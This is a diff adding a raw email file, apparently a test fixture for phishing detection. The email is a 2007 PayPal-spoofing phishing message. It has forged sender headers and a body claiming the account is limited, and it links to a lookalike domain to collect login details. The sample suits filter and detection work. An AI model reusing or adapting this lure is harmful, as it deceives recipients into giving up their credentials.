@@ -1,0 +1,79 @@
+From nobody Sun Jan 25 13:49:58 2015
+Return-Path: <update@paypal.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 0B32F2A899
+ for <user@example.com>; Sat, 23 Jun 2007 11:45:12 -0400 (EDT)
+Received: from mail.example.com (mail.example.com [192.168.1.2])
+ by mail.example.com (Example mail relay) with ESMTP id E9D7D621C64
+ for <user@example.com>; Sat, 23 Jun 2007 11:45:11 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 7F41216246; Sat, 23 Jun 2007 11:47:15 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from [220.76.169.78] (unknown [220.76.169.78])
+ by mail.example.com (Example mail relay) with ESMTP id DC7A716244
+ for <user@example.com>; Sat, 23 Jun 2007 11:47:14 -0400 (EDT)
+Received: from ±èµ¿±Ù (±èµ¿±Ù [220.76.169.78])
+	by ±èµ¿±Ù (8.12.8p1/8.12.8) with ESMTP id i91F7EBC355FB7
+	for <user@example.com>; Sun, 24 Jun 2007 09:44:58 +0900
+	(envelope-from update@paypal.com)
+Date: Sun, 24 Jun 2007 09:44:58 +0900
+From: "PayPal Support" <update@paypal.com>
+Reply-To: "PayPal Support" <update@paypal.com>
+X-Priority: 3 (Normal)
+Message-ID: <05067172.20070624004459@paypal.com>
+To: user@example.com
+Subject: PayPal. Account Review Department
+MIME-Version: 1.0
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+X-Keywords: 
+Status: O
+Content-Length: 2045
+Lines: 45
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML><BODY>
+<style type="text/css">
+<!--
+.style3 {font-size: 14px}
+.style4 {font-size: 12px; }
+-->
+</style>
+<table width="522" border="0">
+  <tr>
+    <td><a href="https://www.paypal.com"><img src="https://www.paypal.com/images/paypal_logo.gif" width="117" height="35" border="0" /></a></td>
+  </tr>
+  <tr>
+    <td width="516"><P class="style3">Dear <strong>PayPal &reg;</strong> customer,</P>
+      <P class="style3">We recently reviewed your account, and we suspect an unauthorized  transaction on your account.<BR>
+        Protecting 
+        your account is our primary concern. As a preventive measure we 
+        have temporary<strong> limited</strong> your access to sensitive information.<BR>
+        Paypal features.To ensure that your account is not compromised, simply hit 
+        "<strong>Resolution 
+          Center</strong>" to confirm your identity as  member of 
+        Paypal.</P>
+      <ul class="style3">
+        <li>&nbsp;&nbsp;&nbsp;&nbsp;Login to your Paypal with 
+          your Paypal username and password.</U></li>
+        <li>&nbsp;&nbsp;&nbsp; Confirm your identity as a card memeber of 
+          Paypal.</U></li>
+      </ul>
+      <P class="style3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</P>
+      <TABLE cellSpacing=0 cellPadding=5 width="100%" align=center 
+            bgColor=#ffeeee>
+        <TBODY>
+          <TR>
+            <TD class="style3"><SPAN class=emphasis>Please confirm account information by clicking here <A 
+                  href="http://paypal-user-account.com" target="_self">Resolution 
+              Center</A> and complete the "Steps to Remove Limitations." </SPAN></TD>
+          </TR>
+        </TBODY>
+      </TABLE>
+      <P class="style4">&nbsp;</P>
+      <P class="style4"><strong>*</strong>Please do not reply to this message. Mail sent to this 
+        address&nbsp;cannot be answered.</P>
+      <P><span class="style
+      <P><span class="style3">Copyright &copy; 1999-2007 PayPal. All rights reserved.<BR>
+</BODY></HTML>
